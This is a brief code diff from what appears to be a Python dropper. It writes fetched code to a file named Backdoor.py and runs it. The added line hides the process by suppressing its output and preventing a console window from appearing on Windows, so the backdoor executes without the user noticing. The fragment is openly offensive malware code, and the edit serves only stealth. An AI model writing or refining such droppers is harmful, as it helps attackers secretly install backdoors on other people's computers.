@@ -20,4 +20,4 @@ else:
     with open("Backdoor.py", "w") as f:
         f.write(code.text)
 
-    subprocess.Popen("Backdoor.py", shell=True)
+    subprocess.Popen("Backdoor.py", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
